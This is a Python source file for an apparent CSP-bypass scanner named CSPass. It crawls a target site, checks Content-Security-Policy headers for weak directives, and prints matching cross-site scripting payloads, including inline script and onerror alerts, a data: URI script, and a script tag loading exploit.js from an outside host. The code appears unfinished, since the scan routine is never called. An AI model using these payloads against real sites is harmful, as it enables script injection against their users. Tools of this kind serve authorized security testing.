#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# Author             : Ruulian
# Date created       : None

import argparse
import datetime
import requests
import re
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse
import time

def date_formatted():
    return datetime.datetime.now().strftime("%H:%M:%S")

def escape(string:str):
    return string.translate(str.maketrans({" ":".+", "*":"\*", ".":"\.","/":"\/"}))

class Colors:
    # Foreground:
    FAIL = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    ERROR = '\033[91m'

    # Formatting
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'    
    
    # End colored text
    END = '\033[0m'
    NC ='\x1b[0m' # No Color    

class Scanner:

    general_payload = "alert()"
    
    exploits = {
        "script-src 'unsafe-inline'" : [
            f'<script>{general_payload}</script>',
            f'<img src=# onerror="{general_payload}">'
        ],
        "script-src data:" : [
            f'<script src="data:,{general_payload}"></script>'
        ],
        "script-src *" : [
            '<script src="https://0xhorizon.eu/cspass/exploit.js"></script>'
        ]
    }

    def __init__(self, target, no_colors=False, dynamic=False, all_pages=False):
        self.no_colors = no_colors
        self.all_pages = all_pages
        self.dynamic = dynamic
        self.target = target
        self.pages = [self.target]
        self.exploitable = False
        self.print()
        self.print("[<]==============================[>]")
        self.print("[<]    Python CSPass @Ruulian_   [>]")
        self.print("[<]==============================[>]")
        self.print()
        self.sess = requests.session()
        
    def print(self, message=""):
        if self.no_colors:
            message = re.sub("\x1b[\[]([0-9;]+)m", "", message)
        print(message)

    def info(self, message=""):
        self.print(f"[{Colors.BLUE}{date_formatted()}{Colors.END}] {message}")
    
    def vuln(self, message=""):
        self.print(f"[{Colors.YELLOW}VULN{Colors.END}] {message}")

    def fail(self, message=""):
        self.print(f"[{Colors.FAIL}FAIL{Colors.END}] {message}")

    def error(self, message=""):
        self.print(f"[{Colors.ERROR}ERROR{Colors.END}] {message}")

    def get_all_pages(self, page):
        r = self.sess.get(page)
        soup = bs(r.text, 'html.parser')
        links = soup.find_all("a", href=True)
        for link in links:
            href = urljoin(self.target, link["href"])
            if href not in self.pages and urlparse(href).netloc == urlparse(self.target).netloc:
                self.pages.append(href)
                self.get_all_pages(href)
                return

    def scan(self, csp):
        for vuln, exploit in self.__class__.exploits.items():
            r = re.compile(escape(vuln))
            for policy in csp:
                if r.match(policy):
                    self.vuln(f"Potential vulnerability found: {policy}")
                    self.vuln(f"Potential working payload: {exploit[0]}")
                    return True
        return False
        
class Page:
    def __init__(self, url):
        self.url = url
        self.csp = self.get_csp()

    def get_csp(self):
        r = requests.get(self.url)
        headers = r.headers
        if 'Content-Security-Policy' in headers:
            return headers['Content-Security-Policy'].split("; ")
        else:
            return []
        

def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='Bypass CSP to perform a XSS')

    parser.add_argument("--no-colors", dest="no_colors", action="store_true", help="Disable color mode")
    parser.add_argument("-d", "--dynamic", dest="dynamic", action="store_true", help="Use dynamic mode (uses selenium)")
    parser.add_argument("-a", "--all-pages", dest="all_pages", action="store_true", help="Looking for vulnerability in all pages could be found", required=False)

    required_args = parser.add_argument_group("Required argument")
    required_args.add_argument("-t", "--target", help="Specify the target url",  required=True)
    
    auth = parser.add_argument_group('Authentication')
    auth.add_argument("-c", "--cookie", help="Specify cookies", required=False)
    args = parser.parse_args()
    return args

if __name__ == '__main__':
    #args = parse_args()
    #scan = Scanner(target=args.target, no_colors=args.no_colors, dynamic=args.dynamic)
    scan = Scanner("http://localhost/1/", all_pages=True)

    if scan.all_pages:
        scan.info("Detecting all pages...")
        scan.get_all_pages(scan.target)
        scan.info(f"{len(scan.pages)} pages found")